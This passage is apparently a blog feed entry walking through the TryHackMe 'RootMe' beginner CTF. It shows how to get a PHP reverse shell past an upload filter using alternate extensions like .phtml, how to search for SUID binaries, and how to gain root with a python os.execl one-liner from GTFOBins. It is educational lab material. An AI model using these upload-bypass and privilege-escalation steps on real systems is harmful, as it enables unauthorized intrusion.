    <p><img src="/assets/img/tryhackme/rootme/edit.png" alt="edit" /></p>
  </li>
  <li>
    <p>Let‚Äôs set up a netcat listener.</p>

    <p><img src="/assets/img/tryhackme/rootme/nc.png" alt="nc" /></p>
  </li>
</ul>

<p>Now we can upload the file to the website. Let‚Äôs go back to the /panel/ directory.</p>

<p>I try to upload the file but it‚Äôs not working. I get error like this.</p>

<p><img src="/assets/img/tryhackme/rootme/error.png" alt="error" /></p>

<p>Let‚Äôs try changing the extension of the PHP file. Like this:</p>

<p><img src="/assets/img/tryhackme/rootme/ex.png" alt="ex" /></p>

<p>If you want, you can try using burp suite, but there is not much possibility anyway, I prefer to change manually.</p>

<p>I will try these: <code class="language-plaintext highlighter-rouge">.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml</code></p>

<p>The <code class="language-plaintext highlighter-rouge">.phtml</code> worked.</p>

<p>Now, let‚Äôs go to the /uploads/ directory and run the reverse shell we uploaded.</p>

<p><img src="/assets/img/tryhackme/rootme/upshell.png" alt="upshell" /></p>

<p>And we are inside.</p>

<p><img src="/assets/img/tryhackme/rootme/in.png" alt="in" /></p>

<p>Now we can get the user flag.
I looked at the user directories in the home directory, but could not find the user.txt.</p>

<p>Now let‚Äôs find user.txt with this command.</p>

<p><img src="/assets/img/tryhackme/rootme/find.png" alt="find" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -name user.txt
</code></pre></div></div>

<p>Yes, we found the user.txt file.</p>

<p><img src="/assets/img/tryhackme/rootme/finduser.png" alt="finduser" /></p>

<p>Let‚Äôs get the user flag.</p>

<p><img src="/assets/img/tryhackme/rootme/user-flag.png" alt="user-flag" /></p>

<p><em><strong>Attention: It allows some files to be uploaded, but when you try to run it in the /uploads/ directory, you get something like this.</strong></em></p>

<p><img src="/assets/img/tryhackme/rootme/uperror.png" alt="uperror" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="4-privilege-escalation">4 Privilege escalation</h2>

<p>Now that we have a shell, let‚Äôs escalate our privileges to root.</p>

<p><br /></p>

<h3 id="41-search-for-files-with-suid-permission-which-file-is-weird">4.1 Search for files with SUID permission, which file is weird?</h3>

<p><em><strong>Hint: find / -user root -perm /4000</strong></em></p>

<p>Based on the hint, I ran the following code on the target system.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -perm -04000 -ls 2&gt;/dev/null
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/rootme/suid.png" alt="suid" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: /usr/bin/python</code></strong></p>

<p><br /></p>

<h3 id="42-find-a-form-to-escalate-your-privileges">4.2 Find a form to escalate your privileges.</h3>

<p><em><strong>Hint : Search for gtfobins</strong></em></p>

<p>Let‚Äôs go to <a href="https://gtfobins.github.io/gtfobins/python/">gtfobins</a> and search for python.</p>

<p><img src="/assets/img/tryhackme/rootme/gtfobins.png" alt="gtfobins" /></p>

<p>Let‚Äôs run the following code on the target machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/rootme/privesc.png" alt="privesc" /></p>

<p>Yesss, We get root privilege. Now let‚Äôs get the root flag.</p>

<p><img src="/assets/img/tryhackme/rootme/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that‚Äôs it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="web, linux, security" /><summary type="html"><![CDATA[A ctf for beginners, can you root me?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/rootme.png" /><media:content medium="image" url="http://localhost:4000/assets/img/rootme.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>